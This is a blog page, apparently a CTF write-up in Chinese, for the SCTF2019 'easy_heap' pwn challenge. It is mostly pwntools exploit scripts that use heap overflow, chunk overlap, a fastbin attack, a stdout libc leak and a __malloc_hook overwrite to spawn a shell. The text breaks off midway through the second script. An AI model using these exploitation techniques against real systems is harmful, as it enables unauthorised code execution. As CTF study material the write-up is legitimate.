@@ -1,0 +1,1071 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="SCTF2019 easy_heap解法1和姚老板的题完全一样，exp稍微改改就过了 exp.py1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980">
+<meta property="og:type" content="article">
+<meta property="og:title" content="easy_heap">
+<meta property="og:url" content="http://yoursite.com/2020/09/03/SCTF2019/easy_heap/index.html">
+<meta property="og:site_name" content="Ama2in9">
+<meta property="og:description" content="SCTF2019 easy_heap解法1和姚老板的题完全一样，exp稍微改改就过了 exp.py1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2020/09/03/SCTF2019/easy_heap/1.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/09/03/SCTF2019/easy_heap/3.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/09/03/SCTF2019/easy_heap/4.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/09/03/SCTF2019/easy_heap/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/03/SCTF2019/easy_heap/6.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/09/03/SCTF2019/easy_heap/7.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/09/03/SCTF2019/easy_heap/8.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/09/03/SCTF2019/easy_heap/9.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/09/03/SCTF2019/easy_heap/5.png">
+<meta property="og:updated_time" content="2020-03-05T13:54:54.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="easy_heap">
+<meta name="twitter:description" content="SCTF2019 easy_heap解法1和姚老板的题完全一样，exp稍微改改就过了 exp.py1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980">
+<meta name="twitter:image" content="http://yoursite.com/2020/09/03/SCTF2019/easy_heap/1.jpg">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/09/03/SCTF2019/easy_heap/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>easy_heap | Ama2in9</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ama2in9</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/03/SCTF2019/easy_heap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ama2in9">
+      <meta itemprop="description" content="Seeing how far I have been.">
+      <meta itemprop="image" content="/images/head.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ama2in9">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">easy_heap
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2020-09-03 09:08:52" itemprop="dateCreated datePublished" datetime="2020-09-03T09:08:52+08:00">2020-09-03</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2020-03-05 21:54:54" itemprop="dateModified" datetime="2020-03-05T21:54:54+08:00">2020-03-05</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/SCTF2019/" itemprop="url" rel="index"><span itemprop="name">SCTF2019</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/09/03/SCTF2019/easy_heap/#comments" itemprop="discussionUrl">
+                
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2020/09/03/SCTF2019/easy_heap/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2020/09/03/SCTF2019/easy_heap/" class="leancloud_visitors" data-flag-title="easy_heap">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Views: </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="SCTF2019-easy-heap"><a href="#SCTF2019-easy-heap" class="headerlink" title="SCTF2019 easy_heap"></a>SCTF2019 easy_heap</h1><h2 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h2><p>和姚老板的题完全一样，exp稍微改改就过了</p>
+<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Alloc</span><span class="params">(p,size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Address 0x'</span>)</span><br><span class="line">    address = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> address</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(p,index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fill</span><span class="params">(p,index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(p)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Mmap: 0x'</span>)</span><br><span class="line">    map_addr = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">    log.success(<span class="string">'map addr =&gt; '</span> + hex(map_addr))</span><br><span class="line">    code_base = Alloc(p,<span class="number">0x88</span>) - <span class="number">0x202068</span> <span class="comment">#0</span></span><br><span class="line">    chunk_arr = code_base + <span class="number">0x202060</span></span><br><span class="line">    log.success(<span class="string">'program loading base =&gt; '</span> + hex(code_base))</span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Alloc(p,<span class="number">0x38</span>)<span class="comment">#1</span></span><br><span class="line">    Alloc(p,<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">    Alloc(p,<span class="number">0xf8</span>)<span class="comment">#3</span></span><br><span class="line">    Alloc(p,<span class="number">0x30</span>)<span class="comment">#4</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Fill(p,<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">0x60</span>+p64(<span class="number">0x140</span>))</span><br><span class="line">    Delete(p,<span class="number">0</span>)</span><br><span class="line">    Delete(p,<span class="number">3</span>)</span><br><span class="line">    <span class="comment">#got 0x240 unsorted bin</span></span><br><span class="line"></span><br><span class="line">    Alloc(p,<span class="number">0x88</span>)<span class="comment">#0</span></span><br><span class="line">    Alloc(p,<span class="number">0x50</span>)<span class="comment">#3 overlap 2</span></span><br><span class="line">    Alloc(p,<span class="number">0x48</span>)<span class="comment">#5</span></span><br><span class="line">    Alloc(p,<span class="number">0xf0</span>)<span class="comment">#6</span></span><br><span class="line">    Fill(p,<span class="number">5</span>,<span class="string">'a'</span>*<span class="number">0x40</span>+p64(<span class="number">0x140</span>))</span><br><span class="line">    Delete(p,<span class="number">0</span>)</span><br><span class="line">    Delete(p,<span class="number">6</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Delete(p,<span class="number">2</span>)</span><br><span class="line">    Alloc(p,<span class="number">0xc0</span>)<span class="comment">#0</span></span><br><span class="line">    Alloc(p,<span class="number">0x20</span>)<span class="comment">#2</span></span><br><span class="line">    Alloc(p,<span class="number">0xf0</span>)<span class="comment">#6</span></span><br><span class="line">    Alloc(p,<span class="number">0x30</span>)<span class="comment">#7</span></span><br><span class="line">    Delete(p,<span class="number">3</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+<span class="string">'\xdd\x25\n'</span></span><br><span class="line">    Alloc(p,<span class="number">0x50</span>)<span class="comment">#3</span></span><br><span class="line">    Fill(p,<span class="number">3</span>,payload)</span><br><span class="line">    log.success(<span class="string">'ready to malloc fake chunk'</span>)</span><br><span class="line">    Alloc(p,<span class="number">0x60</span>)<span class="comment">#8</span></span><br><span class="line">    Alloc(p,<span class="number">0x60</span>)<span class="comment">#9</span></span><br><span class="line">    Fill(p,<span class="number">9</span>,<span class="string">'\x00'</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'\x00\x18\xad\xfb'</span>)</span><br><span class="line">    p.recvn(<span class="number">28</span>)</span><br><span class="line">    libc_addr = u64(p.recvn(<span class="number">8</span>))</span><br><span class="line">    log.info(<span class="string">'libc addr =&gt; '</span> + hex(libc_addr))</span><br><span class="line">    libc_base = libc_addr - <span class="number">0x3c5600</span></span><br><span class="line">    log.info(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    target_addr = libc_base + malloc_hook - <span class="number">0x23</span></span><br><span class="line">    log.success(<span class="string">'malloc hook addr =&gt; '</span> + hex(target_addr))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">2</span>]</span><br><span class="line">    Alloc(p,<span class="number">0x10</span>)<span class="comment">#10</span></span><br><span class="line">    Alloc(p,<span class="number">0xf0</span>)<span class="comment">#11</span></span><br><span class="line">    Delete(p,<span class="number">10</span>)</span><br><span class="line">    log.info(<span class="string">'before to overwrite next chunk'</span>)</span><br><span class="line">    Alloc(p,<span class="number">0x18</span>)<span class="comment">#10</span></span><br><span class="line">    Fill(p,<span class="number">10</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">0x60</span>))</span><br><span class="line">    <span class="comment">#fast bin attack,modify __malloc_hook</span></span><br><span class="line">    Delete(p,<span class="number">8</span>)</span><br><span class="line">    Delete(p,<span class="number">3</span>)</span><br><span class="line">    Alloc(p,<span class="number">0x50</span>)<span class="comment">#3</span></span><br><span class="line">    Fill(p,<span class="number">3</span>,<span class="string">'a'</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(target_addr)+<span class="string">'\n'</span>)</span><br><span class="line">    Alloc(p,<span class="number">0x60</span>)<span class="comment">#8</span></span><br><span class="line">    payload = <span class="string">'\x00'</span>*<span class="number">0x13</span> + p64(shell_addr) + <span class="string">'\n'</span></span><br><span class="line"></span><br><span class="line">    Alloc(p,<span class="number">0x60</span>)<span class="comment">#9</span></span><br><span class="line">    Fill(p,<span class="number">12</span>,payload)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    <span class="comment">#trigger</span></span><br><span class="line"></span><br><span class="line">    Delete(p,<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./easy_heap'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'47.104.89.129'</span>,<span class="number">10004</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">exp(p)</span><br></pre></td></tr></table></figure>
+<h2 id="解法2-17"><a href="#解法2-17" class="headerlink" title="解法2(17)"></a>解法2(17)</h2><p>这个exp更舒服一点，比较好理解<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Alloc(p,<span class="number">0x88</span>)<span class="comment">#0</span></span><br><span class="line">Alloc(p,<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">Alloc(p,<span class="number">0xf8</span>)<span class="comment">#2</span></span><br><span class="line">Alloc(p,<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Delete(p,<span class="number">0</span>)</span><br><span class="line">Fill(p,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x60</span>+p64(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">Delete(p,<span class="number">2</span>)</span><br><span class="line">Delete(p,<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
+<p>首先分配几个堆块，把第0个free掉，Edit(1)修改chunk2的prev_size和size，再释放chunk2，0-2合并成一个大的unsorted bin。</p>
+<p>Delete(1)让chunk1进入fastbin[0x70]，Alloc(0x88)让fastbin的fd和bk被写入main_arena+88。注意此时这个fastbin存在size error，直接从中分配chunk会报错。这时候我们再Free掉刚才的chunk0，再分配一次构造overlapping chunk可以修改fastbin的size为正确的值，从而可以分配fastbin的chunk再部分写泄露libc。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Alloc(p,<span class="number">0x88</span>)<span class="comment">#0</span></span><br><span class="line">Delete(p,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#overwrite the size to 0x70</span></span><br><span class="line">Alloc(p,<span class="number">0x58</span>)<span class="comment">#0</span></span><br><span class="line">Alloc(p,<span class="number">0x98</span>)<span class="comment">#1</span></span><br><span class="line">Fill(p,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x20</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0x71</span>)+<span class="string">'\xdd\x25\n'</span>)</span><br><span class="line">Alloc(p,<span class="number">0x60</span>)<span class="comment">#2</span></span><br><span class="line">Alloc(p,<span class="number">0x60</span>)<span class="comment">#4 stdout</span></span><br><span class="line">Fill(p,<span class="number">4</span>,<span class="string">'\x00'</span>*<span class="number">51</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>+<span class="string">'\n'</span>)</span><br><span class="line">p.recvn(<span class="number">0x40</span>)</span><br><span class="line">libc_bse = u64(p.recv(<span class="number">8</span>)) - <span class="number">3954176</span></span><br></pre></td></tr></table></figure>
+<p>Delete(2)让0x70的块再次进入fastbin，Delete(1)再分配chunk溢出修改fastbin的fd(刚才的套路)，两次分配就可以分配到fake_chunk，继而修改成shell_addr。</p>
+<p>最后Malloc触发malloc_hook不好使，这里free(2)和free(5)触发错误调用malloc_hook拿到shell</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Delete(p,<span class="number">2</span>)<span class="comment">#into 0x70 fast bins</span></span><br><span class="line">Delete(p,<span class="number">1</span>)</span><br><span class="line">Alloc(p,<span class="number">0x70</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Fill(p,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x20</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0x71</span>)+p64(fake_chunk)*<span class="number">2</span>+<span class="string">'\n'</span>)</span><br><span class="line">Alloc(p,<span class="number">0x60</span>)<span class="comment">#2</span></span><br><span class="line">Alloc(p,<span class="number">0x60</span>)<span class="comment">#5</span></span><br><span class="line">Fill(p,<span class="number">5</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(shell_addr)+<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/09/03/SCTF2019/easy_heap/1.jpg" alt="heap_list"></p>
+<h3 id="17-py"><a href="#17-py" class="headerlink" title="17.py"></a>17.py</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Alloc</span><span class="params">(p,size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Address 0x'</span>)</span><br><span class="line">    address = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> address</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(p,index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span 